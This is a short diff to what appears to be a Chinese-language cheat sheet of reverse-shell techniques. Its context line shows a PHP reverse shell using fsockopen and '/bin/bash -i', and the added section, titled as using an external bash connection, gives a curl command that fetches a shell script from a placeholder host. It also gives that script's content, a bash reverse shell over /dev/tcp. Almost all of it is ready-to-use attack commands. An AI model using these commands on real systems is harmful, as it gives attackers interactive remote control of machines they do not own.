@@ -103,6 +103,20 @@ php -r '$sock=fsockopen("host",port);exec("/bin/bash -i <&3 >&3 2>&3");'
 
 
 
+### 使用外置bash连接
+
+```
+curl http://ip:port/shell
+```
+
+shell内容
+
+```
+bash -i >& /dev/tcp/host/port 0>&1
+```
+
+
+
 
 
 参考连接
